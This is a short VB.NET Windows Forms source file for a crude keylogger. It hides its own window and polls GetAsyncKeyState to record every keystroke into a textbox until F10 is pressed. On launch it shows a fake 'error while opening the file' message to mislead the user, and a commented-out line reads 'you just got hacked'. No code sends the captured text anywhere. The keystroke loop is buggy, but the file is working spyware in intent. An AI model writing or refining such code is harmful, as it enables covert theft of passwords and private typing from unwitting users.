Public Class Form1
    Dim hotkey As Boolean
    Dim _done As Boolean
    Dim _char As Integer
    Dim _hotkey1 As Boolean
    Dim _close As Boolean
    Dim _Hiden As Boolean
    Dim i As Integer
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer
    Private Sub TimerHotkey_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerHotkey.Tick
        Me.Hide()
        _hotkey1 = GetAsyncKeyState(Keys.F10)
        If _hotkey1 = True Then
            Me.Show()
            TimerHotkey.Enabled = False

        End If
        _char = 8
        _done = False
        Do While _done = False
            hotkey = GetAsyncKeyState(_char)
            If hotkey = True Then
                If _char = 8 Then
                    TextBox1.Text = TextBox1.Text.Remove(TextBox1.Text.Length - 1, 1)
                Else
                    TextBox1.Text += ChrW(_char)
                End If
                _done = True
            End If
            
            _char += 1
        Loop
        'TextBox1.Refresh()
        

    End Sub


    Private Sub BackgroundWorker1_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Do While _close = False
            _hotkey1 = GetAsyncKeyState(Keys.F10)
            If _hotkey1 = True Then
                _close = True
            End If
            _char = 32
            _done = False
            Do While _done = False
                hotkey = GetAsyncKeyState(_char)
                _char += 1
                If hotkey = True Then
                    TextBox1.Text += ChrW(_char - 1)
                End If
                If _char = 125 Then
                    _done = True
                End If
            Loop

        Loop
        Me.Close()
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'BackgroundWorker1.RunWorkerAsync()
        MsgBox("An error occured while opening the file", MsgBoxStyle.OkOnly, "Warning")
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        'MsgBox("you just got hacked")
    End Sub

End Class
